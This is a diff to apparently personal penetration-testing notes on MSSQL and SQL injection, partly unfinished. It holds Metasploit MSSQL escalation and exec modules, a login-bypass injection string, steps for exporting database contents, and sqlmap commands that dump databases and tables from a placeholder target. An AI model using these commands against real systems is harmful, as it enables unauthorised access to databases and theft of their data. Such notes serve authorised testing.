@@ -17,6 +17,21 @@ msf > use auxiliary/admin/mssql/mssql_escalate_dbowner
 
 Post exploitation
 msf > use auxiliary/admin/mssql/mssql_exec
+
+- Authenticate to a db
+Use Microsoft SQL Server Management Studio (SSMS)
+
+- View data
+In the Object Explorer, expand Databases.
+(### more stuff here ###)
+
+- Export data
+Select a db > right-click > Task > Export Data
+Next > Data source: scroll down to SQL Server Native Client
+Select your authentication method
+Choose a Destination: Microsoft Excel
+Browse to your saved file path
+(### more stuff here ###)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # MySQL
@@ -247,7 +262,9 @@ admin’;--
 
 # sqlmap
 
-sqlmap -r req.txt --level=5 --risk=3                                            Captured login using Burp
+Capture a longin with Burp and save to req.txt
+
+sqlmap -r req.txt --level=5 --risk=3
 sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                Show all dbs
 sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     Show all tables in a particular db
 sqlmap -u "http://target/index.html?page=1" -D <db> -T <table> --dump           Dump all data in a particular table
